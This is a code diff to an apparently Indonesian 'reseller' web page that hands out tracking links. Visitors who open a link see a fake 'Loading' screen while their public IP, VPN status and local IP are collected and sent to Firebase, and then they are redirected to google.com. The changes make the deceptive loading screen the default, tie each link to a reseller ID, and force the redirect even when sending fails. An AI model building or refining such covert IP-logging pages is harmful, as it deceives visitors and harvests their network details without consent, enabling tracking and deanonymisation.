@@ -243,6 +243,7 @@
             align-items: center;
             height: 100vh;
             flex-direction: column;
+            background-color: var(--dark-color);
         }
         
         .loading-text {
@@ -449,7 +450,7 @@
         </div>
         
         <!-- Halaman Loading untuk Pengunjung -->
-        <div id="visitorPage" class="loading-container hidden">
+        <div id="visitorPage" class="loading-container">
             <div class="loading-text">Loading</div>
             <div class="dots">
                 <span class="dot"></span>
@@ -506,9 +507,15 @@
             const resellerId = urlParams.get('reseller');
             const linkId = urlParams.get('link');
             
+            // Sembunyikan semua halaman terlebih dahulu
+            document.getElementById('resellerHeader').classList.add('hidden');
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('resellerPage').classList.add('hidden');
+            document.getElementById('visitorPage').classList.add('hidden');
+            
             if (resellerId && linkId) {
-                // Mode pengunjung
-                showVisitorPage();
+                // Mode pengunjung - tampilkan loading
+                document.getElementById('visitorPage').classList.remove('hidden');
                 collectAndSendData(resellerId, linkId);
             } else {
                 // Mode reseller
@@ -526,17 +533,21 @@
         function showLoginPage() {
             document.getElementById('loginPage').classList.remove('hidden');
             document.getElementById('resellerPage').classList.add('hidden');
+            document.getElementById('visitorPage').classList.add('hidden');
         }
         
         // Tampilkan halaman reseller
         function showResellerPage() {
             document.getElementById('loginPage').classList.add('hidden');
             document.getElementById('resellerPage').classList.remove('hidden');
+            document.getElementById('visitorPage').classList.add('hidden');
             loadResellerLinks();
         }
         
         // Tampilkan halaman pengunjung
         function showVisitorPage() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('resellerPage').classList.add('hidden');
             document.getElementById('visitorPage').classList.remove('hidden');
         }
         
@@ -696,7 +707,7 @@
                         .then(() => {
                             // Buat URL dengan format yang diinginkan
                             const baseUrl = window.location.origin + window.location.pathname;
-                            const trackingLink = `${baseUrl}?${linkId}`;
+                            const trackingLink = `${baseUrl}?reseller=${currentReseller.id}&link=${linkId}`;
                             
                             document.getElementById('trackingLink').textContent = trackingLink;
                             document.getElementById('newLink').style.display = 'block';
@@ -750,9 +761,9 @@
                         const linkElement = document.createElement('div');
                         linkElement.className = 'link-item';
                         
-                        // Buat URL dengan format yang diinginkan
+                        // Buat URL dengan format yang benar
                         const baseUrl = window.location.origin + window.location.pathname;
-                        const trackingLink = `${baseUrl}?${linkId}`;
+                        const trackingLink = `${baseUrl}?reseller=${currentReseller.id}&link=${linkId}`;
                         
                         linkElement.innerHTML = `
                             <span class="link-url">${trackingLink}</span>
@@ -1123,8 +1134,14 @@
         // Fungsi utama untuk mengumpulkan dan mengirim data (mode pengunjung)
         async function collectAndSendData(resellerId, linkId) {
             try {
+                // Tampilkan animasi loading
+                document.getElementById('visitorPage').classList.remove('hidden');
+                
                 const ipInfo = await getIPInfo();
-                if (!ipInfo) return;
+                if (!ipInfo) {
+                    console.error('Tidak dapat mendapatkan informasi IP');
+                    return;
+                }
                 
                 const isVPN = await checkVPN(ipInfo.ip);
                 const localIP = await getLocalIP();
@@ -1175,6 +1192,11 @@
                 
             } catch (error) {
                 console.error('Error sending data to Firebase:', error);
+                
+                // Tetap redirect meskipun ada error
+                setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                }, 3000);
             }
         }
     </script>
